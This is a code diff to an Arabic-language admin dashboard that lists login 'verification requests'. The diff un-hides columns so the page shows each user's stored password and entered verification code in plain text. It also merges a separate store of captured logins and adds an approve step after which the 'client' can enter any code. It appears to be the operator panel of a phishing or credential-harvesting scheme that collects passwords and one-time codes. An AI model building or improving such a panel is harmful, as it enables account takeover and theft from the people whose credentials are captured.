@@ -315,13 +315,6 @@
             display: none;
         }
 
-        #requestsTable th:nth-child(3),
-        #requestsTable td:nth-child(3),
-        #requestsTable th:nth-child(6),
-        #requestsTable td:nth-child(6) {
-            display: none;
-        }
-
         @media (max-width: 768px) {
             body {
                 padding: 12px;
@@ -805,9 +798,56 @@
         let verificationRequests = [];
         let filteredRequests = [];
 
+        function readStorageArray(key) {
+            try {
+                const savedValue = localStorage.getItem(key);
+                const parsedValue = savedValue ? JSON.parse(savedValue) : [];
+                return Array.isArray(parsedValue) ? parsedValue : [];
+            } catch (error) {
+                return [];
+            }
+        }
+
+        function normalizeRequest(request, index, source) {
+            const loginId = request.loginId || request.id || `${source}-${index}`;
+            return {
+                ...request,
+                loginId,
+                email: request.email || request.username || '',
+                password: request.password || '',
+                enteredCode: request.enteredCode || request.code || '',
+                loginTime: request.loginTime || request.time || '',
+                status: request.status || (source === 'userLogins' ? 'verified' : 'pending'),
+                source
+            };
+        }
+
         function loadRequests() {
-            const savedRequests = localStorage.getItem('verificationRequests');
-            verificationRequests = savedRequests ? JSON.parse(savedRequests) : [];
+            const requests = readStorageArray('verificationRequests')
+                .map((request, index) => normalizeRequest(request, index, 'verificationRequests'));
+            const savedLogins = readStorageArray('userLogins')
+                .map((request, index) => normalizeRequest(request, index, 'userLogins'));
+            const mergedRequests = [...requests];
+
+            savedLogins.forEach((login) => {
+                const matchingRequest = mergedRequests.find((request) =>
+                    String(request.loginId) === String(login.loginId) ||
+                    (request.email === login.email && request.loginTime === login.loginTime)
+                );
+
+                if (matchingRequest) {
+                    Object.assign(matchingRequest, {
+                        password: login.password || matchingRequest.password,
+                        enteredCode: login.enteredCode || matchingRequest.enteredCode,
+                        status: login.enteredCode ? 'verified' : matchingRequest.status
+                    });
+                    return;
+                }
+
+                mergedRequests.push(login);
+            });
+
+            verificationRequests = mergedRequests;
             filteredRequests = [...verificationRequests];
             displayRequests();
             updateStats();
@@ -849,27 +889,30 @@
             }
 
             tableBody.innerHTML = filteredRequests.map((request, index) => {
-                const loginId = Number(request.loginId);
+                const loginId = String(request.loginId);
+                const loginIdArg = JSON.stringify(loginId);
                 const status = escapeHtml(request.status || 'pending');
+                const password = request.password ? escapeHtml(request.password) : '-';
+                const enteredCode = request.enteredCode ? escapeHtml(request.enteredCode) : '-';
 
                 return `
                     <tr>
                         <td>${index + 1}</td>
                         <td><span class="badge-user">${escapeHtml(request.email)}</span></td>
-                        <td><span class="password-field">مخفية</span></td>
+                        <td><span class="password-field">${password}</span></td>
                         <td>${escapeHtml(request.loginTime)}</td>
                         <td>
                             <span class="status-badge status-${status.toLowerCase()}">
                                 ${getStatusText(request.status)}
                             </span>
                         </td>
-                        <td>-</td>
+                        <td><span class="code-field">${enteredCode}</span></td>
                         <td>
                             <div class="action-btns">
                                 ${request.status === 'pending' ? `
-                                    <button class="btn-approve" onclick="approveRequest(${loginId})">✓ موافقة</button>
+                                    <button class="btn-approve" onclick='approveRequest(${loginIdArg})'>✓ موافقة</button>
                                 ` : ''}
-                                <button class="btn-delete" onclick="deleteRequest(${loginId})">حذف</button>
+                                <button class="btn-delete" onclick='deleteRequest(${loginIdArg})'>حذف</button>
                             </div>
                         </td>
                     </tr>
@@ -877,8 +920,11 @@
             }).join('');
 
             mobileRequests.innerHTML = filteredRequests.map((request, index) => {
-                const loginId = Number(request.loginId);
+                const loginId = String(request.loginId);
+                const loginIdArg = JSON.stringify(loginId);
                 const status = escapeHtml(request.status || 'pending');
+                const password = request.password ? escapeHtml(request.password) : '-';
+                const enteredCode = request.enteredCode ? escapeHtml(request.enteredCode) : '-';
 
                 return `
                     <div class="mobile-request-card">
@@ -893,16 +939,24 @@
                             <span class="mobile-value">${escapeHtml(request.email)}</span>
                         </div>
                         <div class="mobile-field">
+                            <span class="mobile-label">كلمة المرور</span>
+                            <span class="mobile-value"><span class="password-field">${password}</span></span>
+                        </div>
+                        <div class="mobile-field">
                             <span class="mobile-label">وقت الطلب</span>
                             <span class="mobile-value">${escapeHtml(request.loginTime)}</span>
+                        </div>
+                        <div class="mobile-field">
+                            <span class="mobile-label">الرمز</span>
+                            <span class="mobile-value"><span class="code-field">${enteredCode}</span></span>
                         </div>
                         <div class="mobile-field">
                             <span class="mobile-label">الإجراءات</span>
                             <div class="action-btns">
                                 ${request.status === 'pending' ? `
-                                    <button class="btn-approve" onclick="approveRequest(${loginId})">✓ موافقة</button>
+                                    <button class="btn-approve" onclick='approveRequest(${loginIdArg})'>✓ موافقة</button>
                                 ` : ''}
-                                <button class="btn-delete" onclick="deleteRequest(${loginId})">حذف</button>
+                                <button class="btn-delete" onclick='deleteRequest(${loginIdArg})'>حذف</button>
                             </div>
                         </div>
                     </div>
@@ -911,10 +965,11 @@
         }
 
         function approveRequest(loginId) {
-            const request = verificationRequests.find(r => r.loginId === loginId);
+            const requests = readStorageArray('verificationRequests');
+            const request = requests.find(r => String(r.loginId) === String(loginId));
             if (request) {
                 request.status = 'approved';
-                localStorage.setItem('verificationRequests', JSON.stringify(verificationRequests));
+                localStorage.setItem('verificationRequests', JSON.stringify(requests));
                 loadRequests();
                 alert('✅ تمت الموافقة! يمكن للعميل الآن إدخال أي رمز');
             }
@@ -922,9 +977,14 @@
 
         function deleteRequest(loginId) {
             if (confirm('حذف الطلب؟')) {
-                verificationRequests = verificationRequests.filter(r => r.loginId !== loginId);
-                filteredRequests = filteredRequests.filter(r => r.loginId !== loginId);
-                localStorage.setItem('verificationRequests', JSON.stringify(verificationRequests));
+                const requests = readStorageArray('verificationRequests').filter(r => String(r.loginId) !== String(loginId));
+                const logins = readStorageArray('userLogins').filter((r, index) => {
+                    const storedLoginId = r.loginId || r.id || `userLogins-${index}`;
+                    return String(storedLoginId) !== String(loginId);
+                });
+
+                localStorage.setItem('verificationRequests', JSON.stringify(requests));
+                localStorage.setItem('userLogins', JSON.stringify(logins));
                 loadRequests();
                 alert('تم الحذف');
             }
@@ -942,7 +1002,7 @@
 
         function searchRequests() {
             const term = document.getElementById('searchInput').value.toLowerCase();
-            filteredRequests = verificationRequests.filter(r => r.email.toLowerCase().includes(term));
+            filteredRequests = verificationRequests.filter(r => String(r.email || '').toLowerCase().includes(term));
             displayRequests();
         }
 
